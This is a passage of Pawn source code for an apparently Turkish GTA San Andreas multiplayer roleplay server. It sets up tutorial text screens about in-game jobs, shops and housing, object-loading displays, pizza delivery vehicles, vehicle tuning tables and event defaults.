	TutTxtDraw[38] = TextDrawCreate(166.000000, 344.000000, "aldiktan sonra  ~r~/kasaal~w~ komutunu kullanarak crack yada pot kacirabilirsin.");
	TextDrawBackgroundColor(TutTxtDraw[38], 255);
	TextDrawFont(TutTxtDraw[38], 1);
	TextDrawLetterSize(TutTxtDraw[38], 0.209999, 1.399999);
	TextDrawColor(TutTxtDraw[38], -1);
	TextDrawSetOutline(TutTxtDraw[38], 0);
	TextDrawSetProportional(TutTxtDraw[38], 1);
	TextDrawSetShadow(TutTxtDraw[38], 2);

	TutTxtDraw[39] = TextDrawCreate(166.000000, 367.000000, "Uyusturucu saticisi meslegini alarak uyusturucu yetistirip,");
	TextDrawBackgroundColor(TutTxtDraw[39], 255);
	TextDrawFont(TutTxtDraw[39], 1);
	TextDrawLetterSize(TutTxtDraw[39], 0.209998, 1.399999);
	TextDrawColor(TutTxtDraw[39], -1);
	TextDrawSetOutline(TutTxtDraw[39], 0);
	TextDrawSetProportional(TutTxtDraw[39], 1);
	TextDrawSetShadow(TutTxtDraw[39], 2);

	TutTxtDraw[40] = TextDrawCreate(166.000000, 381.000000, "- ~r~/potsat~w~ ve ~r~/cracksat~w~ komutlariyla oyunculara satabilirsin.");
	TextDrawBackgroundColor(TutTxtDraw[40], 255);
	TextDrawFont(TutTxtDraw[40], 1);
	TextDrawLetterSize(TutTxtDraw[40], 0.209998, 1.399999);
	TextDrawColor(TutTxtDraw[40], -1);
	TextDrawSetOutline(TutTxtDraw[40], 0);
	TextDrawSetProportional(TutTxtDraw[40], 1);
	TextDrawSetShadow(TutTxtDraw[40], 2);

	TutTxtDraw[41] = TextDrawCreate(166.000000, 394.000000, "- ~r~/tohumdik ~w~komutuyla tohum dikip, kendine pot uretebilirsin.");
	TextDrawBackgroundColor(TutTxtDraw[41], 255);
	TextDrawFont(TutTxtDraw[41], 1);
	TextDrawLetterSize(TutTxtDraw[41], 0.209998, 1.399999);
	TextDrawColor(TutTxtDraw[41], -1);
	TextDrawSetOutline(TutTxtDraw[41], 0);
	TextDrawSetProportional(TutTxtDraw[41], 1);
	TextDrawSetShadow(TutTxtDraw[41], 2);

	//
	// EIGHT TUTORIAL TEXT
	//

	TutTxtDraw[42] = TextDrawCreate(166.000000, 331.000000, "Burasi arac saticisidir. Sehir icerisinde birden fazla bulunmaktadir,");
	TextDrawBackgroundColor(TutTxtDraw[42], 255);
	TextDrawFont(TutTxtDraw[42], 1);
	TextDrawLetterSize(TutTxtDraw[42], 0.209999, 1.399999);
	TextDrawColor(TutTxtDraw[42], -1);
	TextDrawSetOutline(TutTxtDraw[42], 0);
	TextDrawSetProportional(TutTxtDraw[42], 1);
	TextDrawSetShadow(TutTxtDraw[42], 2);

	TutTxtDraw[43] = TextDrawCreate(166.000000, 344.000000, "buradan kisisel aracinizi satin alabilirsiniz. VIP olmadan 5 arac sahibi olabilirsiniz.");
	TextDrawBackgroundColor(TutTxtDraw[43], 255);
	TextDrawFont(TutTxtDraw[43], 1);
	TextDrawLetterSize(TutTxtDraw[43], 0.209999, 1.399999);
	TextDrawColor(TutTxtDraw[43], -1);
	TextDrawSetOutline(TutTxtDraw[43], 0);
	TextDrawSetProportional(TutTxtDraw[43], 1);
	TextDrawSetShadow(TutTxtDraw[43], 2);

	TutTxtDraw[44] = TextDrawCreate(166.000000, 357.000000, "ve ayni anda yalnizca birtanesini cikarabilrisiniz.");
	TextDrawBackgroundColor(TutTxtDraw[44], 255);
	TextDrawFont(TutTxtDraw[44], 1);
	TextDrawLetterSize(TutTxtDraw[44], 0.209998, 1.399999);
	TextDrawColor(TutTxtDraw[44], -1);
	TextDrawSetOutline(TutTxtDraw[44], 0);
	TextDrawSetProportional(TutTxtDraw[44], 1);
	TextDrawSetShadow(TutTxtDraw[44], 2);

	TutTxtDraw[45] = TextDrawCreate(166.000000, 371.000000, "Daha fazla bilgi icin ~r~/aracyardim~w~ yazabilirsin.");
	TextDrawBackgroundColor(TutTxtDraw[45], 255);
	TextDrawFont(TutTxtDraw[45], 1);
	TextDrawLetterSize(TutTxtDraw[45], 0.209998, 1.399999);
	TextDrawColor(TutTxtDraw[45], -1);
	TextDrawSetOutline(TutTxtDraw[45], 0);
	TextDrawSetProportional(TutTxtDraw[45], 1);
	TextDrawSetShadow(TutTxtDraw[45], 2);

	TutTxtDraw[46] = TextDrawCreate(166.000000, 385.000000, "Bu bir evdir. Eger bir eve sahip olursan, evinin icerisinde bazi esyalari saklayabilirsin.");
	TextDrawBackgroundColor(TutTxtDraw[46], 255);
	TextDrawFont(TutTxtDraw[46], 1);
	TextDrawLetterSize(TutTxtDraw[46], 0.209998, 1.399999);
	TextDrawColor(TutTxtDraw[46], -1);
	TextDrawSetOutline(TutTxtDraw[46], 0);
	TextDrawSetProportional(TutTxtDraw[46], 1);
	TextDrawSetShadow(TutTxtDraw[46], 2);

	TutTxtDraw[47] = TextDrawCreate(166.000000, 397.000000, "Ayrica ev de kiralayabilirsin.Bilgi icin ~r~/evyardim~w~ ve ~r~/kirayardim~w~ yazabilirsin.");
	TextDrawBackgroundColor(TutTxtDraw[47], 255);
	TextDrawFont(TutTxtDraw[47], 1);
	TextDrawLetterSize(TutTxtDraw[47], 0.209998, 1.399999);
	TextDrawColor(TutTxtDraw[47], -1);
	TextDrawSetOutline(TutTxtDraw[47], 0);
	TextDrawSetProportional(TutTxtDraw[47], 1);
	TextDrawSetShadow(TutTxtDraw[47], 2);

	//
	// NINTH TUTORIAL TEXT
	//

	TutTxtDraw[48] = TextDrawCreate(166.000000, 331.000000, "Biran once oyuna baslamak istedigini biliyoruz, tanitim bitmek uzere!");
	TextDrawBackgroundColor(TutTxtDraw[48], 255);
	TextDrawFont(TutTxtDraw[48], 1);
	TextDrawLetterSize(TutTxtDraw[48], 0.209999, 1.399999);
	TextDrawColor(TutTxtDraw[48], -1);
	TextDrawSetOutline(TutTxtDraw[48], 0);
	TextDrawSetProportional(TutTxtDraw[48], 1);
	TextDrawSetShadow(TutTxtDraw[48], 2);

	TutTxtDraw[49] = TextDrawCreate(166.000000, 344.000000, "- Burasi genel bir markettir. ~r~/satinal~w~ komutuyla esya satin alabilirsin.");
	TextDrawBackgroundColor(TutTxtDraw[49], 255);
	TextDrawFont(TutTxtDraw[49], 1);
	TextDrawLetterSize(TutTxtDraw[49], 0.209999, 1.399999);
	TextDrawColor(TutTxtDraw[49], -1);
	TextDrawSetOutline(TutTxtDraw[49], 0);
	TextDrawSetProportional(TutTxtDraw[49], 1);
	TextDrawSetShadow(TutTxtDraw[49], 2);

	TutTxtDraw[50] = TextDrawCreate(166.000000, 357.000000, "- Burasi kiyafet dukkanidir. ~r~/kiyafetal ~w~yazarak kiyafet alabilirsin.");
	TextDrawBackgroundColor(TutTxtDraw[50], 255);
	TextDrawFont(TutTxtDraw[50], 1);
	TextDrawLetterSize(TutTxtDraw[50], 0.209998, 1.399999);
	TextDrawColor(TutTxtDraw[50], -1);
	TextDrawSetOutline(TutTxtDraw[50], 0);
	TextDrawSetProportional(TutTxtDraw[50], 1);
	TextDrawSetShadow(TutTxtDraw[50], 2);

	TutTxtDraw[51] = TextDrawCreate(172.000000, 371.000000, "~r~/oyuncakal ~w~yazarak karakterine oyuncak alabilirsin.");
	TextDrawBackgroundColor(TutTxtDraw[51], 255);
	TextDrawFont(TutTxtDraw[51], 1);
	TextDrawLetterSize(TutTxtDraw[51], 0.209998, 1.399999);
	TextDrawColor(TutTxtDraw[51], -1);
	TextDrawSetOutline(TutTxtDraw[51], 0);
	TextDrawSetProportional(TutTxtDraw[51], 1);
	TextDrawSetShadow(TutTxtDraw[51], 2);

	TutTxtDraw[52] = TextDrawCreate(166.000000, 384.000000, "- ~r~/kurallar ~w~ve ~r~/yardim~w~ komutlarini yazmayi unutmayin.");
	TextDrawBackgroundColor(TutTxtDraw[48], 255);
	TextDrawFont(TutTxtDraw[52], 1);
	TextDrawLetterSize(TutTxtDraw[52], 0.209998, 1.399999);
	TextDrawColor(TutTxtDraw[52], -1);
	TextDrawSetOutline(TutTxtDraw[52], 0);
	TextDrawSetProportional(TutTxtDraw[52], 1);
	TextDrawSetShadow(TutTxtDraw[52], 2);

	TutTxtDraw[53] = TextDrawCreate(166.000000, 398.000000, "- Oynadigin ilk iki saat boyunca silah kullanamayacaksin.");
	TextDrawBackgroundColor(TutTxtDraw[53], 255);
	TextDrawFont(TutTxtDraw[53], 1);
	TextDrawLetterSize(TutTxtDraw[53], 0.209998, 1.399999);
	TextDrawColor(TutTxtDraw[53], -1);
	TextDrawSetOutline(TutTxtDraw[48], 0);
	TextDrawSetProportional(TutTxtDraw[48], 1);
	TextDrawSetShadow(TutTxtDraw[48], 2);


	//------------------------------------------------------------------------------------------------------------
	// Objects loading text draws
	//------------------------------------------------------------------------------------------------------------

	ObjectsLoadingTD[0] = TextDrawCreate(321.000000, 220.000000, "Interior objeleri yukleniyor...");
	TextDrawAlignment(ObjectsLoadingTD[0], 2);
	TextDrawBackgroundColor(ObjectsLoadingTD[0], 255);
	TextDrawFont(ObjectsLoadingTD[0], 1);
	TextDrawLetterSize(ObjectsLoadingTD[0], 0.570000, 2.800001);
	TextDrawColor(ObjectsLoadingTD[0], -1);
	TextDrawSetOutline(ObjectsLoadingTD[0], 0);
	TextDrawSetProportional(ObjectsLoadingTD[0], 1);
	TextDrawSetShadow(ObjectsLoadingTD[0], 3);

	ObjectsLoadingTD[1] = TextDrawCreate(455.000000, 266.000000, "'");
	TextDrawBackgroundColor(ObjectsLoadingTD[1], 255);
	TextDrawFont(ObjectsLoadingTD[1], 1);
	TextDrawLetterSize(ObjectsLoadingTD[1], -0.009999, -7.000000);
	TextDrawColor(ObjectsLoadingTD[1], 255);
	TextDrawSetOutline(ObjectsLoadingTD[1], 0);
	TextDrawSetProportional(ObjectsLoadingTD[1], 1);
	TextDrawSetShadow(ObjectsLoadingTD[1], 0);
	TextDrawUseBox(ObjectsLoadingTD[1], 1);
	TextDrawBoxColor(ObjectsLoadingTD[1], 0x000000AA);
	TextDrawTextSize(ObjectsLoadingTD[1], 185.000000, -37.000000);

	ObjectsLoadingTD[2] = TextDrawCreate(185.000000, 266.000000, "'");
	TextDrawBackgroundColor(ObjectsLoadingTD[2], 255);
	TextDrawFont(ObjectsLoadingTD[2], 1);
	TextDrawLetterSize(ObjectsLoadingTD[2], -0.009999, -7.000000);
	TextDrawColor(ObjectsLoadingTD[2], -1);
	TextDrawSetOutline(ObjectsLoadingTD[2], 0);
	TextDrawSetProportional(ObjectsLoadingTD[2], 1);
	TextDrawSetShadow(ObjectsLoadingTD[2], 0);
	TextDrawUseBox(ObjectsLoadingTD[2], 1);
	TextDrawBoxColor(ObjectsLoadingTD[2], 269488383);
	TextDrawTextSize(ObjectsLoadingTD[2], 185.000000, -37.000000);

	ObjectsLoadingTD[3] = TextDrawCreate(455.000000, 266.000000, "'");
	TextDrawBackgroundColor(ObjectsLoadingTD[3], 255);
	TextDrawFont(ObjectsLoadingTD[3], 1);
	TextDrawLetterSize(ObjectsLoadingTD[3], -0.009999, -7.000000);
	TextDrawColor(ObjectsLoadingTD[3], -1);
	TextDrawSetOutline(ObjectsLoadingTD[3], 0);
	TextDrawSetProportional(ObjectsLoadingTD[3], 1);
	TextDrawSetShadow(ObjectsLoadingTD[3], 0);
	TextDrawUseBox(ObjectsLoadingTD[3], 1);
	TextDrawBoxColor(ObjectsLoadingTD[3], 151587327);
	TextDrawTextSize(ObjectsLoadingTD[3], 455.000000, -37.000000);

	ObjectsLoadingTD[4] = TextDrawCreate(455.000000, 266.000000, "'");
	TextDrawBackgroundColor(ObjectsLoadingTD[4], 255);
	TextDrawFont(ObjectsLoadingTD[4], 1);
	TextDrawLetterSize(ObjectsLoadingTD[4], -0.009999, -1.000000);
	TextDrawColor(ObjectsLoadingTD[4], 255);
	TextDrawSetOutline(ObjectsLoadingTD[4], 0);
	TextDrawSetProportional(ObjectsLoadingTD[4], 1);
	TextDrawSetShadow(ObjectsLoadingTD[4], 0);
	TextDrawUseBox(ObjectsLoadingTD[4], 1);
	TextDrawBoxColor(ObjectsLoadingTD[4], 151587327);
	TextDrawTextSize(ObjectsLoadingTD[4], 185.000000, -87.000000);

	ObjectsLoadingTD[5] = TextDrawCreate(455.000000, 212.000000, "'");
	TextDrawBackgroundColor(ObjectsLoadingTD[5], 255);
	TextDrawFont(ObjectsLoadingTD[5], 1);
	TextDrawLetterSize(ObjectsLoadingTD[5], -0.009999, -1.000000);
	TextDrawColor(ObjectsLoadingTD[5], -1);
	TextDrawSetOutline(ObjectsLoadingTD[5], 0);
	TextDrawSetProportional(ObjectsLoadingTD[5], 1);
	TextDrawSetShadow(ObjectsLoadingTD[5], 0);
	TextDrawUseBox(ObjectsLoadingTD[5], 1);
	TextDrawBoxColor(ObjectsLoadingTD[5], 269488383);
	TextDrawTextSize(ObjectsLoadingTD[5], 185.000000, -37.000000);

	ObjectsLoadingTD[6] = TextDrawCreate(318.000000, 220.000000, "Interior objeleri yuklendi.");
	TextDrawAlignment(ObjectsLoadingTD[6], 2);
	TextDrawBackgroundColor(ObjectsLoadingTD[6], 255);
	TextDrawFont(ObjectsLoadingTD[6], 1);
	TextDrawLetterSize(ObjectsLoadingTD[6], 0.570000, 2.800001);
	TextDrawColor(ObjectsLoadingTD[6], -637073409);
	TextDrawSetOutline(ObjectsLoadingTD[6], 0);
	TextDrawSetProportional(ObjectsLoadingTD[6], 1);
	TextDrawSetShadow(ObjectsLoadingTD[6], 3);

	PizzaVehicles[0] = AddStaticVehicleEx(448,2121.60009766,-1788.00000000,13.19999981,0.00000000,3,6,300); //Pizzaboy
	PizzaVehicles[1] = AddStaticVehicleEx(448,2120.30004883,-1788.00000000,13.19999981,0.00000000,3,6,300); //Pizzaboy
	PizzaVehicles[2] = AddStaticVehicleEx(448,2119.10009766,-1788.00000000,13.19999981,358.00000000,3,6,300); //Pizzaboy
	PizzaVehicles[3] = AddStaticVehicleEx(448,2117.80004883,-1788.00000000,13.19999981,357.99499512,3,6,300); //Pizzaboy
	PizzaVehicles[4] = AddStaticVehicleEx(448,2116.30004883,-1788.00000000,13.19999981,357.99499512,3,6,300); //Pizzaboy
	PizzaVehicles[5] = AddStaticVehicleEx(448,2122.80004883,-1788.00000000,13.19999981,357.99499512,3,6,300); //Pizzaboy
	PizzaVehicles[6] = AddStaticVehicleEx(448,2113.69995117,-1788.09997559,13.19999981,357.99499512,3,6,300); //Pizzaboy
	PizzaVehicles[7] = AddStaticVehicleEx(448,2112.39990234,-1788.09997559,13.19999981,357.99499512,3,6,300); //Pizzaboy
	PizzaVehicles[8] = AddStaticVehicleEx(448,2111.10009766,-1788.09997559,13.19999981,357.99499512,3,6,300); //Pizzaboy
	PizzaVehicles[9] = AddStaticVehicleEx(448,2109.60009766,-1788.09997559,13.19999981,357.99499512,3,6,300); //Pizzaboy
	PizzaVehicles[10] = AddStaticVehicleEx(448,2108.30004883,-1788.09997559,13.19999981,357.99499512,3,6,300); //Pizzaboy
	PizzaVehicles[11] = AddStaticVehicleEx(448,2107.00000000,-1788.09997559,13.19999981,357.99499512,3,6,300); //Pizzaboy

	/*PizzaVehicles[12] = AddStaticVehicleEx(448,2125.72778320,-1821.16296387,13.22481918,270.00000000,-1,-1,300); //Pizzaboy
	PizzaVehicles[13] = AddStaticVehicleEx(448,2125.58886719,-1819.16699219,13.22481918,270.00000000,-1,-1,300); //Pizzaboy
	PizzaVehicles[14] = AddStaticVehicleEx(448,2125.53417969,-1817.41784668,13.22481918,270.00000000,-1,-1,300); //Pizzaboy
	PizzaVehicles[15] = AddStaticVehicleEx(448,2125.59228516,-1815.41772461,13.22481918,270.00000000,-1,-1,300); //Pizzaboy
	PizzaVehicles[16] = AddStaticVehicleEx(448,2125.63085938,-1813.41699219,13.22481918,270.00000000,-1,-1,300); //Pizzaboy
	PizzaVehicles[17] = AddStaticVehicleEx(448,2125.65161133,-1811.47399902,13.22481918,270.00000000,-1,-1,300); //Pizzaboy
	PizzaVehicles[18] = AddStaticVehicleEx(448,2125.63940430,-1809.86132812,13.22481918,270.00000000,-1,-1,300); //Pizzaboy
	PizzaVehicles[19] = AddStaticVehicleEx(448,2125.61669922,-1807.59777832,13.22481918,270.00000000,-1,-1,300); //Pizzaboy
	PizzaVehicles[20] = AddStaticVehicleEx(448,2125.77197266,-1805.30444336,13.22481918,270.00000000,-1,-1,300); //Pizzaboy
	PizzaVehicles[21] = AddStaticVehicleEx(448,2125.79687500,-1802.72937012,13.22481918,270.00000000,-1,-1,300); //Pizzaboy
	PizzaVehicles[22] = AddStaticVehicleEx(448,2125.77929688,-1799.91442871,13.22481918,270.00000000,-1,-1,300); //Pizzaboy
	PizzaVehicles[23] = AddStaticVehicleEx(448,2125.85205078,-1797.00598145,13.22481918,270.00000000,-1,-1,300); //Pizzaboy
	PizzaVehicles[24] = AddStaticVehicleEx(448,2125.74169922,-1794.25805664,13.22481918,270.00000000,-1,-1,300); //Pizzaboy*/


	EventInfo[EventFamily] = 255;
	vehicleMods[0][4] = {1013, 1024, 0, 0};
	vehicleMods[0][6] = {1018, 1019, 1020, 1021};
	vehicleMods[1][0] = {1001, 1003, 0, 0};
	vehicleMods[1][1] = {1004, 1005, 0, 0};
	vehicleMods[1][2] = {1006, 0, 0, 0};
	vehicleMods[1][3] = {1007, 0, 0, 0};
	vehicleMods[1][4] = {1013, 0, 0, 0};
	vehicleMods[1][6] = {1019, 1020, 0, 0};
	vehicleMods[1][12] = {1143, 1145, 0, 0};
	vehicleMods[4][0] = {1002, 1016, 1000, 0};
	vehicleMods[4][3] = {1007, 0, 0, 0};
	vehicleMods[4][4] = {1013, 0, 0, 0};
	vehicleMods[4][6] = {1019, 1020, 1021, 0};
	vehicleMods[5][0] = {1000, 1001, 1014, 1023};
	vehicleMods[5][6] = {1018, 1019, 1020, 1021};
	vehicleMods[10][0] = {1001, 1003, 1023, 0};
	vehicleMods[10][3] = {1007, 0, 0, 0};
	vehicleMods[10][4] = {1013, 1024, 0, 0};
	vehicleMods[10][6] = {1019, 1020, 1021, 0};
	vehicleMods[15][0] = {1001, 1003, 1023, 0};
	vehicleMods[15][6] = {1018, 1019, 0, 0};
	vehicleMods[15][3] = {1007, 0, 0, 0};
	vehicleMods[18][0] = {1002, 1016, 0, 0};
	vehicleMods[18][2] = {1006, 0, 0, 0};
	vehicleMods[18][6] = {1020, 1021, 0, 0};
	vehicleMods[20][0] = {1001, 1003, 0, 0};
	vehicleMods[20][1] = {1004, 1005, 0, 0};
	vehicleMods[20][6] = {1019, 1021, 0, 0};
	vehicleMods[21][0] = {1000, 1014, 1016, 1023};
	vehicleMods[21][6] = {1018, 1019, 1020, 1021};
	vehicleMods[22][3] = {1007, 0, 0, 0};
	vehicleMods[22][4] = {1013, 0, 0, 0};
	vehicleMods[22][6] = {1019, 1020, 1021, 0};
	vehicleMods[26][0] = {1001, 1003, 0, 0};
	vehicleMods[26][1] = {1004, 1005, 0, 0};
	vehicleMods[26][2] = {1006, 0, 0, 0};
	vehicleMods[26][6] = {1019, 1021, 0, 0};
	vehicleMods[36][0] = {1001, 1003, 0, 0};
	vehicleMods[36][2] = {1006, 0, 0, 0};
	vehicleMods[36][3] = {1007, 0, 0, 0};
	vehicleMods[36][4] = {1013, 0, 0, 0};
	vehicleMods[36][6] = {1019, 1020, 1021, 1022};
	vehicleMods[39][0] = {1001, 1003, 1023, 0};
	vehicleMods[39][3] = {1007, 0, 0, 0};
	vehicleMods[39][4] = {1013, 0, 0, 0};
	vehicleMods[39][12] = {1143, 1145, 0, 0};
	vehicleMods[77][2] = {1006, 0, 0, 0};
	vehicleMods[77][3] = {1007, 0, 0, 0};
	vehicleMods[77][6] = {1018, 1019, 1020, 1021};
	vehicleMods[78][1] = {1004, 1005, 1012, 0};
	vehicleMods[78][4] = {1013, 1024, 0, 0};
	vehicleMods[78][6] = {1020, 1021, 1022, 0};
	vehicleMods[89][0] = {1000, 1002, 1016, 0};
	vehicleMods[89][1] = {1004, 1005, 0, 0};
	vehicleMods[89][2] = {1006, 0, 0, 0};
	vehicleMods[89][4] = {1013, 1024, 0, 0};
	vehicleMods[89][6] = {1018, 1019, 1020, 0};
	vehicleMods[91][0] = {1003, 1014, 1023, 0};
	vehicleMods[91][3] = {1007, 0, 0, 0};
	vehicleMods[91][6] = {1018, 1019, 1020, 1021};
	vehicleMods[91][12] = {1143, 1145, 0, 0};
	vehicleMods[92][0] = {1000, 1016, 0, 0};
	vehicleMods[92][1] = {1004, 1005, 0, 0};
	vehicleMods[92][2] = {1006, 0, 0, 0};
	vehicleMods[96][0] = {1001, 1002, 1003, 1023};
	vehicleMods[96][1] = {1011, 0, 0, 0};
	vehicleMods[96][2] = {1006, 0, 0, 0};
	vehicleMods[96][6] = {1019, 1020, 0, 0};
	vehicleMods[96][12] = {1143, 0, 0, 0};
	vehicleMods[100][4] = {1013, 1024, 0, 0};
	vehicleMods[100][6] = {1019, 1020, 1021, 0};
	vehicleMods[116][0] = {1000, 1002, 1015, 1016};
	vehicleMods[116][1] = {1004, 0, 0, 0};
	vehicleMods[116][3] = {1007, 0, 0, 0};
	vehicleMods[116][6] = {1018, 1019, 1020, 1021};
	vehicleMods[117][0] = {1002, 1003, 1016, 1023};
	vehicleMods[117][3] = {1007, 0, 0, 0};
	vehicleMods[117][6] = {1018, 1019, 1020, 0};
	vehicleMods[117][12] = {1143, 1145, 0, 0};
	vehicleMods[118][0] = {1001, 1003, 1023, 0};
	vehicleMods[118][1] = {1005, 0, 0, 0};
	vehicleMods[118][2] = {1006, 0, 0, 0};
	vehicleMods[118][3] = {1007, 0, 0, 0};
	vehicleMods[118][4] = {1013, 0, 0, 0};
	vehicleMods[118][6] = {1018, 1020, 0, 0};
	vehicleMods[118][12] = {1143, 1145, 0, 0};
	vehicleMods[127][0] = {1001, 1014, 1015, 0};
	vehicleMods[127][3] = {1007, 0, 0, 0};
	vehicleMods[127][6] = {1018, 1020, 1021, 0};
	vehicleMods[129][0] = {1001, 1003, 1023, 0};
	vehicleMods[129][1] = {1011, 1012, 0, 0};
	vehicleMods[129][2] = {1006, 0, 0, 0};
	vehicleMods[129][3] = {1007, 0, 0, 0};
	vehicleMods[129][6] = {1018, 1019, 1020, 0};
	vehicleMods[134][1] = {1100, 1123, 1125, 0};
	vehicleMods[134][3] = {1101, 1106, 0, 0};
	vehicleMods[134][6] = {1126, 1127, 0, 0};
	vehicleMods[134][10] = {1179, 1185, 0, 0};
	vehicleMods[134][11] = {1178, 1180, 0, 0};
	vehicleMods[135][3] = {1118, 1119, 0, 0};
	vehicleMods[135][6] = {1113, 1114, 0, 0};
	vehicleMods[135][10] = {1115, 1116, 1117, 0};
	vehicleMods[135][11] = {1109, 1110, 0, 0};
	vehicleMods[136][2] = {1103, 1128, 0, 0};
	vehicleMods[136][3] = {1108, 0, 0, 0};
	vehicleMods[136][6] = {1104, 1105, 0, 0};
	vehicleMods[136][10] = {1181, 1182, 0, 0};
	vehicleMods[136][11] = {1183, 1184, 0, 0};
	vehicleMods[140][0] = {1001, 1023, 0, 0};
	vehicleMods[140][1] = {1004, 0, 0, 0};
	vehicleMods[140][2] = {1006, 0, 0, 0};
	vehicleMods[140][3] = {1007, 0, 0, 0};
	vehicleMods[140][4] = {1024, 0, 0, 0};
	vehicleMods[140][6] = {1018, 1019, 1020, 0};
	vehicleMods[140][12] = {1143, 1145, 0, 0};
	vehicleMods[142][0] = {1014, 1015, 0, 0};
	vehicleMods[142][6] = {1018, 1019, 1020, 1021};
	vehicleMods[142][12] = {1145, 0, 0, 0};
	vehicleMods[146][0] = {1001, 1002, 1023, 0};
	vehicleMods[146][1] = {1004, 0, 0, 0};
	vehicleMods[146][2] = {1006, 0, 0, 0};
	vehicleMods[146][3] = {1007, 0, 0, 0};
	vehicleMods[146][4] = {1024, 0, 0, 0};
	vehicleMods[146][6] = {1018, 1019, 0, 0};
	vehicleMods[146][12] = {1143, 1145, 0, 0};
	vehicleMods[147][0] = {1000, 1003, 1016, 0};
	vehicleMods[147][6] = {1018, 1019, 1020, 1021};
	vehicleMods[147][12] = {1143, 0, 0, 0};
	vehicleMods[149][0] = {1001, 1003, 1023, 0};
	vehicleMods[149][1] = {1011, 1012, 0, 0};
	vehicleMods[149][3] = {1007, 0, 0, 0};
	vehicleMods[149][6] = {1018, 1019, 1020, 0};
	vehicleMods[149][12] = {1143, 1145, 0, 0};
	vehicleMods[150][0] = {1001, 1003, 1023, 0};
	vehicleMods[150][1] = {1004, 1005, 0, 0};
	vehicleMods[150][2] = {1006, 0, 0, 0};
	vehicleMods[150][6] = {1018, 1019, 1020, 0};
	vehicleMods[150][12] = {1143, 1145, 0, 0};
	vehicleMods[151][0] = {1002, 1003, 1016, 1023};
	vehicleMods[151][1] = {1005, 0, 0, 0};
	vehicleMods[151][2] = {1006, 0, 0, 0};
	vehicleMods[151][6] = {1018, 1019, 1020, 1021};
	vehicleMods[158][0] = {1164, 1163, 0, 0};
	vehicleMods[158][2] = {1088, 1091, 0, 0};
	vehicleMods[158][3] = {1090, 1093, 0, 0};
	vehicleMods[158][6] = {1092, 1089, 0, 0};
	vehicleMods[158][10] = {1166, 1165, 0, 0};
	vehicleMods[158][11] = {1168, 1167, 0, 0};
	vehicleMods[159][0] = {1162, 1158, 0, 0};
	vehicleMods[159][2] = {1067, 1068, 0, 0};
	vehicleMods[159][3] = {1069, 1070, 0, 0};
	vehicleMods[159][6] = {1065, 1066, 0, 0};
	vehicleMods[159][10] = {1160, 1173, 0, 0};
	vehicleMods[159][11] = {1159, 1161, 0, 0};
	vehicleMods[160][0] = {1138, 1139, 0, 0};
	vehicleMods[160][2] = {1032, 1033, 0, 0};
	vehicleMods[160][3] = {1026, 1031, 0, 0};
	vehicleMods[160][6] = {1028, 1029, 0, 0};
	vehicleMods[160][10] = {1169, 1170, 0, 0};
	vehicleMods[160][11] = {1141, 1140, 0, 0};
	vehicleMods[161][0] = {1058, 1060, 0, 0};
	vehicleMods[161][2] = {1055, 1061, 0, 0};
	vehicleMods[161][3] = {1056, 1057, 0, 0};
	vehicleMods[161][6] = {1064, 1059, 0, 0};
	vehicleMods[161][10] = {1155, 1157, 0, 0};
	vehicleMods[161][11] = {1154, 1156, 0, 0};
	vehicleMods[162][0] = {1147, 1146, 0, 0};
	vehicleMods[162][2] = {1035, 1038, 0, 0};
	vehicleMods[162][3] = {1036, 1039, 0, 0};
	vehicleMods[162][6] = {1034, 1037, 0, 0};
	vehicleMods[162][10] = {1171, 1172, 0, 0};
	vehicleMods[162][11] = {1149, 1148, 0, 0};
	vehicleMods[165][0] = {1049, 1050, 0, 0};
	vehicleMods[165][2] = {1054, 1053, 0, 0};
	vehicleMods[165][3] = {1047, 1048, 0, 0};
	vehicleMods[165][6] = {1046, 1045, 0, 0};
	vehicleMods[165][10] = {1153, 1152, 0, 0};
	vehicleMods[165][11] = {1150, 1151, 0, 0};
	vehicleMods[167][2] = {1130, 1131, 0, 0};
	vehicleMods[167][3] = {1133, 0, 0, 0};
	vehicleMods[167][6] = {1129, 1132, 0, 0};
	vehicleMods[167][10] = {1189, 1188, 0, 0};
	vehicleMods[167][11] = {1187, 1186, 0, 0};
	vehicleMods[175][3] = {1042, 0, 0, 0};
	vehicleMods[175][6] = {1044, 1043, 0, 0};
	vehicleMods[175][10] = {1174, 1175, 0, 0};
	vehicleMods[175][11] = {1176, 1177, 0, 0};
	vehicleMods[176][3] = {1137, 1134, 0, 0};
	vehicleMods[176][6] = {1136, 1135, 0, 0};
	vehicleMods[176][10] = {1191, 1190, 0, 0};
	vehicleMods[176][11] = {1192, 1193, 0, 0};
	vehicleMods[180][0] = {1001, 1023, 0, 0};
	vehicleMods[180][2] = {1006, 0, 0, 0};
	vehicleMods[180][3] = {1007, 0, 0, 0};
	vehicleMods[180][6] = {1018, 1020, 0, 0};
	vehicleMods[185][0] = {1001, 1003, 1023, 0};
	vehicleMods[185][2] = {1006, 0, 0, 0};
	vehicleMods[185][3] = {1007, 0, 0, 0};
	vehicleMods[185][4] = {1013, 0, 0, 0};
	vehicleMods[185][6] = {1018, 1019, 1020, 0};
	vehicleMods[185][12] = {1143, 1145, 0, 0};
	vehicleMods[189][0] = {1000, 1016, 0, 0};
	vehicleMods[189][1] = {1005, 1004, 0, 0};
	vehicleMods[189][2] = {1006, 0, 0, 0};
	vehicleMods[189][3] = {1007, 0, 0, 0};
	vehicleMods[189][4] = {1013, 1024, 0, 0};
	vehicleMods[189][6] = {1018, 1020, 0, 0};
	vehicleMods[189][12] = {1145, 0, 0, 0};
	vehicleMods[200][1] = {1004, 1005, 0, 0};
	vehicleMods[200][2] = {1006, 0, 0, 0};
	vehicleMods[200][3] = {1007, 0, 0, 0};
	vehicleMods[200][4] = {1013, 0, 0, 0};
	vehicleMods[200][6] = {1018, 1020, 1022, 0};
	vehicleMods[203][0] = {1001, 1023, 0, 0};
	vehicleMods[203][2] = {1006, 0, 0, 0};
	vehicleMods[203][3] = {1007, 0, 0, 0};
	vehicleMods[203][4] = {1024, 0, 0, 0};
	vehicleMods[203][6] = {1019, 1020, 0, 0};
	vehicleMods[203][12] = {1143, 1145, 0, 0};

	EventInfo[EventRequest] = 999;
	EventInfo[EventCreator] = 999;
	for(new x; x < sizeof(EventInfo[EventStaff]); x++) {
		EventInfo[EventStaff][x] = 999;
	}
	SetVehicleHealth(LSPDVehicles[33], 2500.0);
	SetVehicleHealth(FBIVehicles[12], 2500.0);
	SetVehicleHealth(LSPDVehicles[19], 2500.0);
	SetVehicleHealth(LSPDVehicles[20], 2500.0);
	SetVehicleHealth(LSPDVehicles[21], 2500.0);
	SetVehicleHealth(LSPDVehicles[22], 2500.0);

